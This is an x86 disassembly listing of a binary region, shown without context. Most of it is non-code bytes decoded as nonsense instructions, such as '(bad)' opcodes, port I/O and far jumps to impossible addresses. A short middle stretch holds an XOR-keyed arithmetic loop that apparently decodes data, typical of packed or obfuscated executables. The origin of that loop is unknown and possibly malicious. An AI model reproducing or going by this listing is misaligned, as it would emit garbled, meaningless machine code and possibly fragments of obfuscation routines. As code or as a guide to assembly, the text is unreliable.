  4039ba:	ficomp DWORD PTR [edi+0x32]
  4039bd:	pushf  
  4039be:	mov    al,ds:0xac5f608
  4039c3:	sbb    eax,0xe6d6d928
  4039c8:	(bad)  
  4039c9:	js     0x4039c1
  4039cb:	cld    
  4039cc:	mov    al,0xb1
  4039ce:	rcr    BYTE PTR [ecx+0x4af42c92],cl
  4039d4:	call   0x86651bd0
  4039d9:	pusha  
  4039da:	and    ebx,DWORD PTR [esp+ebx*4]
  4039dd:	scas   al,BYTE PTR es:[edi]
  4039de:	test   DWORD PTR [esi+eax*8],0x1f9f8df2
  4039e5:	cmp    al,BYTE PTR [edi]
  4039e7:	cld    
  4039e8:	(bad)
  4039eb:	push   DWORD PTR [bp+di-0x2c]
  4039f0:	inc    ebx
  4039f1:	test   al,0x4b
  4039f3:	jp     0x4039a2
  4039f5:	sub    al,0x48
  4039f7:	ins    BYTE PTR es:[edi],dx
  4039f8:	add    BYTE PTR [edi+ebx*8],dh
  4039fb:	xchg   ebx,eax
  4039fc:	pop    esp
  4039fd:	shr    BYTE PTR [edx-0x39],cl
  403a00:	xlat   BYTE PTR ds:[ebx]
  403a01:	out    0xd8,al
  403a03:	lea    eax,[edi-0x148ee59]
  403a09:	fld    st(1)
  403a0b:	sbb    ch,cl
  403a0d:	hlt    
  403a0e:	retf   0xa11
  403a11:	loope  0x4039cf
  403a13:	out    0x64,eax
  403a15:	lahf   
  403a16:	or     DWORD PTR [edx+esi*2-0x6d],ecx
  403a1a:	lock mov ebx,0x72ddec05
  403a20:	leave  
  403a21:	adc    al,0xdf
  403a23:	fidiv  DWORD PTR [ebp-0x39]
  403a26:	cdq    
  403a27:	or     esi,DWORD PTR [edi+0x371f025c]
  403a2d:	ret    
  403a2e:	mov    eax,ds:0x28358b1a
  403a33:	dec    edx
  403a34:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  403a35:	int    0x2a
  403a37:	add    al,0xdd
  403a39:	xchg   ecx,eax
  403a3a:	jecxz  0x4039fe
  403a3c:	push   eax
  403a3d:	mov    ah,0xd1
  403a3f:	ret    
  403a40:	stos   BYTE PTR es:[edi],al
  403a41:	push   edx
  403a42:	imul   ebp,DWORD PTR [ecx+0x2a],0xfc5803b7
  403a49:	loop   0x403a87
  403a4b:	xor    BYTE PTR [esi],dl
  403a4d:	fwait
  403a4e:	mov    esp,0xf46942ba
  403a53:	and    dh,ch
  403a55:	jg     0x4039f6
  403a57:	mov    ah,0xf6
  403a59:	push   ebx
  403a5a:	jmp    0xd406:0xf0f3fb1f
  403a61:	pop    esp
  403a62:	sahf   
  403a63:	sbb    al,0xa8
  403a65:	xchg   esi,eax
  403a66:	inc    eax
  403a67:	aad    0xec
  403a69:	out    dx,eax
  403a6a:	add    DWORD PTR [edi+ecx*2-0x7a75bc35],edi
  403a71:	sbb    al,0xa1
  403a73:	test   al,0x34
  403a75:	outs   dx,DWORD PTR ds:[esi]
  403a76:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  403a77:	mov    dl,0xe1
  403a79:	icebp  
  403a7a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  403a7b:	fs push 0x56
  403a7e:	pop    es
  403a7f:	js     0x403a1a
  403a81:	into   
  403a82:	jg     0x403a73
  403a84:	or     DWORD PTR [edi+0xd],eax
  403a87:	jle    0x403a37
  403a89:	mov    ds:0x98e7379e,al
  403a8e:	mov    edi,0x9be35a8e
  403a93:	dec    esp
  403a94:	jl     0x403a98
  403a96:	push   ss
  403a97:	sbb    esp,DWORD PTR fs:[edx*4-0x46dd3d3f]
  403a9f:	ins    BYTE PTR es:[edi],dx
  403aa0:	lock cs icebp 
  403aa3:	cs push esp
  403aa5:	and    al,0xef
  403aa7:	sbb    eax,0x8b14a0cd
  403aac:	inc    ebp
  403aad:	fdiv   st,st(6)
  403aaf:	pop    esi
  403ab0:	lock mov WORD PTR [eax-0x78cc38c6],cs
  403ab7:	mov    ebx,0xc89c89cf
  403abc:	and    cl,BYTE PTR [ebp+0xbd81afb]
  403ac2:	popf   
  403ac3:	js     0x403a63
  403ac5:	push   0xa45ecf78
  403aca:	push   edi
  403acb:	cmp    BYTE PTR [esi],0xda
  403ace:	jmp    0xf8d3eb37
  403ad3:	mov    esp,0xaf2e6d03
  403ad8:	dec    edi
  403ad9:	pop    esp
  403ada:	mov    edx,0x3aea160
  403adf:	ja     0x403b23
  403ae1:	leave  
  403ae2:	jbe    0x403b4e
  403ae4:	dec    edx
  403ae5:	stos   DWORD PTR es:[edi],eax
  403ae6:	mov    ds:0x3872809e,eax
  403aeb:	dec    ecx
  403aec:	mov    ecx,0xf5743972
  403af1:	jns    0x403b65
  403af3:	je     0x403ad1
  403af5:	cmp    DWORD PTR [ebx+0x2a000a99],edx
  403afb:	enter  0xcf02,0xff
  403aff:	pop    ebx
  403b00:	mov    dl,0x21
  403b02:	jb     0x403b55
  403b04:	test   al,0xcc
  403b06:	push   cs
  403b07:	add    al,0x35
  403b09:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  403b0a:	rcr    BYTE PTR [esi],cl
  403b0c:	mov    WORD PTR [esi-0xd],ds
  403b0f:	(bad)  
  403b11:	mov    esi,0xd13ba626
  403b16:	mov    ecx,DWORD PTR [ebp-0xc]
  403b19:	mov    DWORD PTR [ebp+0x8],ecx
  403b1c:	mov    ecx,DWORD PTR [ebp+0x8]
  403b1f:	je     0x406073
  403b25:	jmp    0x403b5a
  403b2a:	mov    ecx,DWORD PTR [ebp+0x8]
  403b2d:	mov    edx,DWORD PTR [ebp-0x8]
  403b30:	xor    ecx,eax
  403b32:	xor    edx,eax
  403b34:	sub    ecx,edx
  403b36:	sub    ecx,esi
  403b38:	xor    ecx,eax
  403b3a:	mov    DWORD PTR [ebp+0x8],ecx
  403b3d:	mov    ecx,DWORD PTR [ebp+0x8]
  403b40:	mov    edx,DWORD PTR [ebp+0x8]
  403b43:	xor    ecx,eax
  403b45:	imul   edx,edx,0x5708f5
  403b4b:	add    ecx,esi
  403b4d:	lea    ecx,[ebp+ecx*4-0x64]
  403b51:	mov    edi,DWORD PTR [ecx]
  403b53:	add    edx,edi
  403b55:	mov    DWORD PTR [ecx],edx
  403b57:	mov    ecx,DWORD PTR [ebp+0x8]
  403b5a:	xor    ecx,eax
  403b5c:	add    ecx,esi
  403b5e:	jne    0x403b2a
  403b64:	mov    ecx,DWORD PTR [ebp-0x14]
  403b67:	mov    edx,DWORD PTR [ebp+0x8]
  403b6a:	xor    ecx,eax
  403b6c:	xor    edx,eax
  403b6e:	add    ecx,esi
  403b70:	add    edx,esi
  403b72:	cmp    ecx,edx
  403b74:	jae    0x405f8d
  403b7a:	lea    edx,[ecx-0x3272db]
  403b80:	mov    DWORD PTR [ebp-0x18],edx
  403b83:	mov    edi,DWORD PTR [ebp-0x18]
  403b86:	mov    DWORD PTR [ebp-0x24],0x705fd08
  403b8d:	lea    edx,[ebp-0x24]
  403b90:	mov    DWORD PTR [ebp-0x10],edx
  403b93:	mov    edx,DWORD PTR [ebp-0x10]
  403b96:	add    DWORD PTR [edx],0x705fa08
  403b9c:	mov    ebx,DWORD PTR [ebp-0x10]
  403b9f:	xor    edi,eax
  403ba1:	add    edi,DWORD PTR [ebx]
  403ba3:	lea    edx,[ebp+ecx*4-0x64]
  403ba7:	mov    ebx,DWORD PTR [edx]
  403ba9:	xor    edi,ebx
  403bab:	mov    DWORD PTR [edx],edi
  403bad:	jmp    0x405f30
  403bb2:	pop    esi
  403bb3:	stos   BYTE PTR es:[edi],al
  403bb4:	sbb    DWORD PTR [eax],esp
  403bb6:	gs (bad) 
  403bb8:	push   ebx
  403bb9:	lds    ecx,FWORD PTR fs:[ebp+0x16f2f475]
  403bc0:	mov    eax,ds:0x625f1c59
  403bc5:	bound  ebx,QWORD PTR [edi+ebx*2]
  403bc8:	bound  esp,QWORD PTR [edx+0x24]
  403bcb:	mov    ebx,edi
  403bcd:	jo     0x403c01
  403bcf:	sub    BYTE PTR [ebx-0x66],0x0
  403bd3:	push   ss
  403bd4:	pop    edi
  403bd5:	xchg   ebp,eax
  403bd6:	inc    esp
  403bd7:	sahf   
  403bd8:	mov    al,ds:0x68e06d0f
  403bdd:	adc    al,0x9a
  403bdf:	movs   BYTE PTR es:[edi],BYTE PTR cs:[esi]
  403be1:	fucomp st(3)
  403be3:	std    
  403be4:	pop    edi
  403be5:	jns    0x403ba7
  403be7:	outs   dx,DWORD PTR ds:[esi]
  403be8:	(bad)  
  403be9:	cli    
  403bea:	mov    ecx,0x828c9ccc
  403bef:	and    al,0x1d
  403bf1:	xor    DWORD PTR [esi],eax
  403bf3:	add    ebx,DWORD PTR [ecx-0x6af44d79]
  403bf9:	les    edx,FWORD PTR [eax+0x2]
  403bfc:	jae    0x403c5a
  403bfe:	shl    DWORD PTR [eax-0x39],0xba
  403c02:	or     WORD PTR [esi+0x25],0x33
  403c07:	ds iret 
  403c09:	scas   eax,DWORD PTR es:[edi]
  403c0a:	test   al,0x5a
  403c0c:	mov    ds:0x577a36f9,eax
  403c11:	jg     0x403c6d
  403c13:	int    0xfa
  403c15:	xchg   BYTE PTR [ebp-0x29],ah
  403c18:	cmp    dh,BYTE PTR [ebp+edx*2+0xb]
  403c1c:	adc    eax,0x3e91a5c4
  403c21:	rcl    DWORD PTR [ecx+edi*2+0x33fd3918],cl
  403c28:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  403c29:	arpl   WORD PTR [ebx],ax
  403c2b:	pushf  
  403c2c:	or     ebx,DWORD PTR [eax+0x1c]
  403c2f:	jnp    0x403c45
  403c31:	xor    ebx,DWORD PTR [ecx-0x72]
  403c34:	jo     0x403c37
  403c36:	or     eax,0x69f5c9aa
  403c3b:	shl    BYTE PTR [esi-0x28],0x3c
  403c3f:	out    0xfc,al
  403c41:	test   al,0x3c
  403c43:	push   0xe
  403c45:	enter  0xb643,0xc1
  403c49:	pop    es
  403c4a:	dec    ebp
  403c4b:	outs   dx,DWORD PTR ds:[esi]
  403c4c:	rol    DWORD PTR [ebx+0xa],0xc
  403c50:	adc    dh,dl
  403c52:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  403c53:	rol    DWORD PTR [edx*8-0x65d8d158],1
  403c5a:	hlt    
  403c5b:	ins    DWORD PTR es:[edi],dx
  403c5c:	add    DWORD PTR [ebp+ecx*2-0x16],ecx
  403c60:	imul   edi,esp,0x46
  403c63:	inc    esi
  403c64:	mov    al,ds:0xfe86d599
  403c69:	cli    
  403c6a:	dec    edx
  403c6b:	lahf   
  403c6c:	inc    eax
  403c6d:	into   
  403c6e:	fistp  QWORD PTR [edx+0x2122cf6]
  403c74:	(bad)  
  403c75:	sti    
  403c76:	mov    edi,0xda8d099a
  403c7b:	push   esi
  403c7c:	xlat   BYTE PTR ds:[ebx]
  403c7d:	push   ss
  403c7e:	adc    dl,ah
  403c80:	dec    eax
  403c81:	add    eax,0x4e7c5aa8
  403c86:	mov    ds:0x3c06b7e6,eax
  403c8b:	neg    DWORD PTR [eax-0x6b9290a0]
  403c91:	mov    dh,0x4c
  403c93:	mov    ebp,0xaf7a69dc
  403c98:	jg     0x403cd2
  403c9a:	outs   dx,DWORD PTR ds:[esi]
  403c9b:	push   0xffffffd1
  403c9d:	and    BYTE PTR [eax+0x3e],bh
  403ca0:	(bad)  
  403ca1:	lea    eax,ss:[ecx+0x17e0c708]
  403ca8:	enter  0xf620,0xf3
  403cac:	mov    ebp,DWORD PTR [ecx]
  403cae:	push   0x54d66516
  403cb3:	inc    eax
  403cb4:	pop    edx
  403cb5:	fnstenv [eax+0x7ff58944]
  403cbb:	xchg   edi,eax
  403cbc:	push   esi
  403cbd:	shr    bl,1
  403cbf:	xor    al,0x78
  403cc1:	call   0xbd0a5011
  403cc6:	jae    0x403cf8
  403cc8:	add    ebp,DWORD PTR [eax-0x5d]
  403ccb:	mov    ah,al
  403ccd:	adc    dl,BYTE PTR [esi-0x2e5f436d]
  403cd3:	in     al,dx
  403cd4:	pop    es
  403cd5:	pop    ds
  403cd6:	dec    ebp
  403cd7:	push   ebx
  403cd8:	xor    BYTE PTR [eax],dh
  403cda:	adc    ah,BYTE PTR [edx]
  403cdc:	je     0x403d25
  403cde:	rol    BYTE PTR [edx],0x13
  403ce1:	cmp    al,0xaa
  403ce3:	inc    edi
  403ce4:	(bad)
  403ce7:	inc    edi
  403ce8:	fadd   QWORD PTR [ebp+0x431c35bd]
  403cee:	fld    QWORD PTR [ebx]
  403cf0:	mov    ebp,0xfb3af103
  403cf5:	or     eax,DWORD PTR [esp+edi*1]
  403cf8:	jne    0x403d37
  403cfa:	mov    ah,0x3d
  403cfc:	scas   al,BYTE PTR es:[edi]
  403cfd:	fsub   QWORD PTR [edx+edx*8+0x46]
  403d01:	int    0xc
  403d03:	add    al,0x5a
  403d05:	mov    eax,0xe0b5c583
  403d0a:	cwde   
  403d0b:	sub    eax,0x33c91100
  403d10:	or     al,0x26
  403d12:	test   BYTE PTR [edx-0x2336f98f],bh
  403d18:	lock idiv DWORD PTR [ecx-0x7a]
  403d1c:	dec    ecx
  403d1d:	gs iret 
  403d1f:	(bad)  
  403d20:	(bad)  
  403d21:	xchg   esi,eax
  403d22:	push   esp
  403d23:	ja     0x403d3e
  403d25:	inc    eax
  403d26:	lahf   
  403d27:	out    0x1a,eax
  403d29:	add    DWORD PTR [ecx+0x56034a27],eax
  403d2f:	repnz fs stc 
  403d32:	mov    ch,0x89
  403d34:	mov    dh,0x62
  403d36:	clc    
  403d37:	jbe    0x403d39
  403d39:	scas   al,BYTE PTR es:[edi]
  403d3a:	test   DWORD PTR [edx+0x3e],edi
  403d3d:	xchg   esp,eax
  403d3e:	sub    DWORD PTR [edi],0x5dfb7835
  403d44:	mov    edi,edi
  403d46:	jnp    0x403d01
  403d48:	pop    edx
  403d49:	adc    edi,DWORD PTR [edx]
  403d4b:	imul   esi,DWORD PTR [eax-0x28],0x21132ebc
  403d52:	jne    0x403d70
  403d54:	pop    esp
  403d55:	pusha  
  403d56:	adc    BYTE PTR [ecx],0x2b
  403d59:	(bad)  
  403d5b:	stos   BYTE PTR es:[edi],al
  403d5c:	rcr    bh,1
  403d5e:	aad    0x75
  403d60:	adc    eax,0x450fe40d
  403d65:	jl     0x403cee
  403d67:	mov    edi,0x6ff7de32
  403d6c:	mov    eax,0x709adfe
  403d71:	mov    dh,0xa7
  403d73:	pop    ecx
  403d74:	jg     0x403de9
  403d76:	aas    
  403d77:	mov    ecx,0xbcc9eb72
  403d7c:	sub    BYTE PTR ds:[esi+eax*4-0x5a52af19],ch
  403d84:	jg     0x403d54
  403d86:	lea    esp,[edi+ebx*1]
  403d89:	push   eax
  403d8a:	ins    BYTE PTR es:[edi],dx
  403d8b:	push   ds
  403d8c:	push   ss
  403d8d:	pusha  
  403d8e:	sbb    esi,DWORD PTR [edx]
  403d90:	loopne 0x403dff
  403d92:	stos   BYTE PTR es:[edi],al
  403d93:	out    dx,eax
  403d94:	dec    eax
  403d95:	(bad)  
  403d97:	cmp    esi,edx
  403d99:	out    0xdf,al
  403d9b:	adc    al,0x1d
  403d9d:	cmp    dh,BYTE PTR es:[edi-0x5a]
  403da1:	pop    edi
  403da2:	add    al,0xcc
  403da5:	xchg   esp,eax
  403da6:	push   0x63808cf6
  403dab:	jecxz  0x403de1
  403dad:	dec    esp
  403dae:	test   al,0x84
  403db0:	cs push 0x61
  403db3:	dec    esi
  403db4:	call   0x7800:0x328475de
  403dbb:	xchg   edx,eax
  403dbc:	push   0xac5acf43
  403dc1:	jmp    0x2ecbc92d
  403dc6:	shr    DWORD PTR [ebp+0x7c],0xba
  403dca:	inc    edi
  403dcb:	mov    dh,0xf3
  403dcd:	mov    DWORD PTR [ecx],esi
  403dcf:	inc    ebp
  403dd0:	push   eax
  403dd1:	shr    DWORD PTR [ebx],cl
  403dd3:	xchg   ebx,eax
  403dd4:	pop    esp
  403dd5:	in     al,dx
  403dd6:	sub    al,BYTE PTR [edx+0x6e]
  403dd9:	jns    0x403d97
  403ddb:	jmp    0x403ddc
  403ddd:	push   esp
  403dde:	ins    BYTE PTR es:[edi],dx
  403ddf:	repnz sbb BYTE PTR [ebx],dl
  403de2:	cmc    
  403de3:	pop    esi
  403de4:	fisttp WORD PTR [ebp-0x17]
  403de7:	js     0x403d91
  403de9:	mov    ds:0x51296bfb,eax
  403dee:	jmp    0x1ceb479e
  403df3:	fnsave [esi+esi*2]
  403df6:	xor    eax,0x860a5381
  403dfb:	jmp    0xfd848e16
  403e00:	pop    ebx
  403e01:	push   edx
  403e02:	sbb    ecx,DWORD PTR [esi-0x2e]
  403e05:	sbb    esi,DWORD PTR [esi]
  403e07:	jns    0x403dfd
  403e09:	mov    dl,0x40
  403e0b:	pop    ebp
  403e0c:	jno    0x403df8
  403e0e:	pop    edi
  403e0f:	dec    ebp
  403e10:	sbb    bh,0xb4
  403e13:	lea    eax,[esi+0x6f]
  403e16:	(bad)  [ebp-0x6e8176b8]
  403e1c:	or     ecx,DWORD PTR [ecx+edx*1+0x1e]
  403e20:	inc    edi
  403e21:	and    DWORD PTR [eax+0x1f],edx
  403e24:	add    BYTE PTR [ebp+0x22093392],0x18
  403e2b:	pop    edi
  403e2c:	mov    ecx,0x4c8652cb
  403e31:	mov    ebx,0x7c9ef00c
  403e36:	retf   
  403e37:	mov    edi,ebp
  403e39:	xchg   esi,eax
  403e3a:	add    DWORD PTR [edx+0x7],edi
  403e3d:	fisubr WORD PTR [edi-0x7e06454a]
  403e43:	and    DWORD PTR [eax+0x5180cf38],eax
  403e49:	adc    bl,BYTE PTR [ebx-0x6e614f68]
  403e4f:	jae    0x403ddd
  403e51:	les    ecx,FWORD PTR [edx]
  403e53:	neg    BYTE PTR [ebp-0x1219bf31]
  403e59:	aaa    
  403e5a:	pop    esi
  403e5b:	retf   0xaf6d
  403e5e:	pushf  
  403e5f:	sub    BYTE PTR [edi+0x5c],dl
  403e62:	push   ds
  403e63:	jge    0x403ea1
  403e65:	jnp    0x403de7
  403e67:	push   es
  403e68:	out    0x96,al
  403e6a:	mov    al,ds:0x7782c3b3
  403e6f:	mov    ch,0x65
  403e71:	jecxz  0x403e3e
  403e73:	adc    DWORD PTR [edi],edx
  403e75:	cwde   
  403e76:	jae    0x403edc
  403e78:	sub    dh,BYTE PTR [eax+0x3998a5d2]
  403e7e:	pop    esp
  403e7f:	add    al,0x7c
  403e81:	or     eax,0x1665705e
  403e86:	sbb    esi,DWORD PTR [edi-0x6e765322]
  403e8c:	loopne 0x403ea8
  403e8e:	sub    al,0x8
  403e90:	pop    ds
  403e91:	call   0x3d7b1d3
  403e96:	xor    ah,BYTE PTR [ebx-0x48]
  403e99:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  403e9a:	inc    esp
  403e9b:	lds    eax,FWORD PTR [ecx+0x1cd331b6]
  403ea1:	xchg   edi,esp
  403ea3:	xor    ecx,DWORD PTR [edi+0x5b9713c9]
  403ea9:	mov    esp,0xec0e81a0
  403eae:	dec    edx
  403eaf:	sti    
  403eb0:	xor    DWORD PTR [ebp-0x46],ebx
  403eb3:	jb     0x403e74
  403eb5:	(bad)  [esi-0x518f6f0d]
  403ebb:	ins    BYTE PTR es:[edi],dx
  403ebc:	jns    0x403e93
  403ebe:	xor    ebp,DWORD PTR [edi+0x18182a29]
  403ec4:	cmp    BYTE PTR [ecx],bh
  403ec6:	popf   
  403ec7:	(bad)  
  403ec8:	retf   
  403ec9:	stos   BYTE PTR es:[edi],al
  403eca:	mov    dl,0xf7
  403ecc:	push   ebp
  403ecd:	aam    0xe1
  403ecf:	push   es
  403ed0:	arpl   WORD PTR [edi-0x25f4b202],bp
  403ed6:	add    esp,0x28
  403ed9:	mov    al,ds:0xde3e2b5e
  403ede:	(bad)  
  403edf:	or     BYTE PTR [eax+0x3],dl
  403ee2:	and    eax,0x176d66d2
  403ee7:	mov    BYTE PTR [edx-0x2f43af4b],dh
  403eed:	xchg   ebp,eax
  403eee:	lods   al,BYTE PTR ds:[esi]
  403eef:	cli    
  403ef0:	add    BYTE PTR [ebx-0x17342166],0x8e
  403ef7:	loopne 0x403f3c
  403ef9:	or     BYTE PTR [ebx+ebp*1-0x17],0xff
  403efe:	mov    esp,DWORD PTR [ebp-0x32]
  403f01:	dec    ebx
  403f02:	pushf  
  403f03:	(bad)  
  403f04:	push   cs
  403f05:	mov    ecx,DWORD PTR [edx-0x3f]
  403f08:	mov    ss,esp
  403f0a:	xchg   ebp,eax
  403f0b:	jae    0x403f00
  403f0d:	loope  0x403f60
  403f0f:	inc    ebp
  403f10:	int3   
  403f11:	call   0x153414aa
  403f16:	cmp    al,0x45
  403f18:	inc    ebx
  403f19:	js     0x403ec2
  403f1b:	dec    ebx
  403f1c:	adc    ah,BYTE PTR [edx]
  403f1e:	lds    eax,FWORD PTR [ebp-0x3c]
  403f21:	mov    esi,DWORD PTR [esp+ecx*1-0x61d5d5f8]
  403f28:	fmul   st(6),st
  403f2a:	jp     0x403f3e
  403f2c:	es aad 0xe6
  403f2f:	push   es
  403f30:	adc    eax,0xeebbb18a
  403f35:	mov    dl,0x9d
  403f37:	push   es
  403f38:	jae    0x403f6c
  403f3a:	lods   al,BYTE PTR ds:[esi]
  403f3b:	sub    al,0xbf
  403f3d:	pop    eax
  403f3e:	arpl   WORD PTR [ecx+0x2a9ebdcc],sp
  403f44:	adc    eax,0x40761458
  403f49:	mov    ds:0x72da3e55,al
  403f4e:	shl    BYTE PTR [ebx+0x8],0x7
  403f52:	test   al,0xc7
  403f54:	in     al,dx
  403f55:	ins    DWORD PTR es:[edi],dx
  403f56:	nop
  403f57:	aas    
  403f58:	mov    fs,WORD PTR [eax+eax*2]
  403f5b:	or     al,0x1
  403f5d:	mov    esi,ebx
  403f5f:	pop    edi
  403f60:	or     ch,BYTE PTR [eax]
  403f62:	push   0x59
  403f64:	dec    esi
  403f65:	rol    ch,0x46
  403f68:	icebp  
  403f69:	test   BYTE PTR [ebx-0x442b6030],ah
  403f6f:	mov    BYTE PTR [esi+0x68],dh
  403f72:	cmp    BYTE PTR [ebx-0x62],dh
  403f75:	hlt    
  403f76:	jb     0x403f3c
  403f78:	dec    ebx
  403f79:	(bad)  
  403f7a:	enter  0x9642,0x44
  403f7e:	dec    ecx
  403f7f:	push   esi
  403f80:	in     eax,dx
  403f81:	test   BYTE PTR [edx],0x8f
  403f84:	jle    0x403ff7
  403f86:	mov    ds,WORD PTR [eax+esi*4]
  403f89:	sahf   
  403f8a:	inc    esi
  403f8b:	push   ds
  403f8c:	repnz lods al,BYTE PTR ds:[esi]
  403f8e:	fst    QWORD PTR [eax-0x55f567c8]
  403f94:	and    ecx,DWORD PTR [edi-0x30739e1e]
  403f9a:	cmovl  esp,DWORD PTR [edi+0x4b]
  403f9e:	pop    ds
  403f9f:	xor    eax,0xbd9eb663
  403fa4:	hlt    
  403fa5:	jb     0x403f9d
  403fa7:	mov    bl,0x9e
  403fa9:	cmc    
  403faa:	jg     0x403ffa
  403fac:	push   esp
  403fad:	xchg   edx,edx
  403faf:	jge    0x403f9f
  403fb1:	jl     0x403fe3
  403fb3:	gs pop eax
  403fb5:	and    BYTE PTR [edi+0x191a024d],bh
  403fbb:	mov    dl,0xf3
  403fbd:	fnstcw WORD PTR [ecx+0x6a]
  403fc0:	or     ch,0xab
  403fc3:	dec    esi
  403fc4:	pop    ebp
  403fc5:	mov    ah,0x1
  403fc7:	test   ah,dl
  403fc9:	int3   
  403fca:	out    0xb1,al
  403fcc:	push   0xd
  403fce:	sbb    ch,BYTE PTR [ebx-0x36]
  403fd1:	pop    ebx
  403fd2:	xor    DWORD PTR [ecx-0x35],ebx
  403fd5:	popa   
  403fd6:	in     al,dx
  403fd7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  403fd8:	add    DWORD PTR [edx+0x20141644],eax
  403fde:	rcr    DWORD PTR [esi-0x73],1
  403fe1:	test   DWORD PTR [eax-0x30916399],esp
  403fe7:	pop    eax
  403fe8:	les    esi,FWORD PTR [ecx+0x47]
  403feb:	mov    bl,0xb3
  403fed:	sub    ebp,DWORD PTR ds:0xd680c381
  403ff3:	lods   al,BYTE PTR ds:[esi]
  403ff4:	mov    bl,0x70
  403ff6:	enter  0xdf9f,0xef
  403ffa:	inc    edx
  403ffb:	aam    0xe8
  403ffd:	nop
  403ffe:	in     al,dx
  403fff:	adc    ebx,DWORD PTR [ebp-0x31]
  404002:	sahf   
  404003:	jmp    0x403fe7
  404005:	jg     0x403fbe
  404007:	push   ebx
  404008:	xor    al,0xac
  40400a:	mov    DWORD PTR [ebx],ecx
  40400c:	or     BYTE PTR ds:0x61bf31bd,ah
  404012:	sbb    al,0x51
  404014:	sbb    bl,BYTE PTR [ebp+0x63]
  404017:	outs   dx,DWORD PTR ds:[esi]
  404018:	outs   dx,DWORD PTR ds:[esi]
  404019:	popf   
  40401a:	mov    ecx,0xe47a7461
  40401f:	sub    bl,dl
  404021:	push   ds
  404022:	mov    eax,0x6385587d
  404027:	push   ebp
  404028:	imul   ebp,DWORD PTR [esi-0x63],0x64
  40402c:	in     eax,0x83
  40402e:	icebp  
  40402f:	xchg   ebp,eax
  404030:	xchg   ecx,eax
  404031:	dec    bp
  404033:	mov    bl,0xe8
  404035:	das    
  404036:	lock dec eax
  404038:	ins    DWORD PTR es:[edi],dx
  404039:	dec    ebp
  40403a:	mov    ebx,0x2821b7c9
  40403f:	mov    al,ds:0xad6f38fa
  404044:	retf   0xa6f4
  404047:	imul   esp,ebp,0x4
  40404a:	mov    edi,0xb35b930d
  40404f:	or     eax,0x634b624b
  404054:	call   0x7d08ea73
  404059:	xchg   ecx,eax
  40405a:	mov    ds:0x675d291d,al
  40405f:	sub    BYTE PTR [edx+0x167f933f],0x27
  404066:	fcmovu st,st(1)
  404068:	mov    BYTE PTR [eax-0x6c],bh
  40406b:	fdiv   DWORD PTR [edi+ecx*4-0x264321d3]
  404072:	push   edx
  404073:	cld    
  404074:	outs   dx,BYTE PTR ds:[esi]
  404075:	cwde   
  404076:	jge    0x403ffe
  404078:	out    0x43,eax
  40407a:	jl     0x404005
  40407c:	pop    ecx
  40407d:	int    0x43
  40407f:	jno    0x404054
  404081:	in     al,dx
  404082:	js     0x404060
  404084:	inc    esi
  404085:	jge    0x4040a2
  404087:	sub    DWORD PTR [ebp+0x3bfee885],edi
  40408d:	int3   
  40408e:	out    dx,eax
  40408f:	mov    ebx,0xaa10060c
  404094:	fcomp  QWORD PTR ss:[esi+ebp*8]
  404098:	test   DWORD PTR [eax],0x59cf7b01
  40409e:	sub    edx,DWORD PTR ds:0x6de81312
  4040a4:	js     0x4040ff
  4040a6:	adc    eax,0x2049b2c
  4040ab:	mov    ds:0x38898a95,al
  4040b0:	outs   dx,BYTE PTR ds:[esi]
  4040b1:	sub    esp,DWORD PTR [esi-0x44]
  4040b4:	cmp    eax,DWORD PTR [eax+0x47]
  4040b7:	popa   
  4040b8:	push   esp
  4040b9:	sub    ch,BYTE PTR [edi]
  4040bb:	daa    
  4040bc:	dec    edi
  4040bd:	mov    esi,0x84d5c526
  4040c2:	add    esi,DWORD PTR [ebp+0x32]
  4040c5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4040c6:	cmp    dl,ch
  4040c8:	sub    esp,DWORD PTR [edi]
  4040ca:	cli    
  4040cb:	stc    
  4040cc:	scas   al,BYTE PTR es:[edi]
  4040cd:	mov    eax,ds:0xa3aadf18
  4040d2:	pop    ebx
  4040d3:	inc    ecx
  4040d4:	or     DWORD PTR ds:[edx-0x6ee4148a],edx
  4040db:	ret    0x5272
  4040de:	fsubr  QWORD PTR [esp+eiz*2+0x63]
  4040e2:	lods   eax,DWORD PTR ds:[esi]
  4040e3:	sti    
  4040e4:	retf   0xec3f
  4040e7:	ds movs DWORD PTR es:[edi],DWORD PTR fs:[esi]
  4040ea:	jns    0x40410b
  4040ec:	sub    DWORD PTR [ebp-0x79],esp
  4040ef:	rcl    al,0xf1
  4040f2:	loopne 0x40415d
  4040f4:	aam    0x93
  4040f6:	addr16 xor al,0xa5
  4040f9:	jne    0x404127
  4040fb:	dec    esi
  4040fc:	imul   esi,DWORD PTR [ecx+0x49c6803d],0x28a2fa0
  404106:	xchg   ecx,eax
  404107:	dec    esp
  404108:	xchg   DWORD PTR [esi],ebp
  40410a:	call   0xd4ba:0xe1d416b
  404111:	loopne 0x4040bb
  404113:	or     BYTE PTR [esi+0x1b8362],al
  404119:	mov    DWORD PTR [ebx+edi*2],esp
  40411c:	lods   eax,DWORD PTR ds:[esi]
  40411d:	lea    ecx,[ecx+ebx*1-0x4ec9ef1e]
  404124:	ret    
  404125:	dec    esp
  404126:	pop    edi
  404127:	(bad)  
  404129:	call   0x3a7b:0xc9fbc489
  404130:	cdq    
  404131:	lahf   
  404132:	les    esp,FWORD PTR [eax]
  404134:	jae    0x4040e1
  404136:	xchg   ebx,eax
  404137:	sbb    DWORD PTR [ebx+0x16642d46],0x23650932
  404141:	es pop ebp
  404143:	adc    esi,DWORD PTR [edx-0x9]
  404146:	push   ebp
  404147:	in     eax,dx
  404148:	add    BYTE PTR [eax+0x60bee71e],bl
  40414e:	shl    BYTE PTR [edi],0x91
  404151:	or     edx,edx
  404153:	mov    eax,ds:0xf0783014
  404158:	ins    BYTE PTR es:[edi],dx
  404159:	adc    eax,0x7667359b
  40415e:	and    al,0xa7
  404160:	std    
  404161:	in     eax,0xdd
  404163:	fist   DWORD PTR [esi]
  404165:	cmc    
  404166:	sbb    eax,0xb620278d
  40416b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40416c:	jp     0x40410a
  40416e:	fmul   QWORD PTR [ebx-0x73fd5485]
  404174:	push   ebp
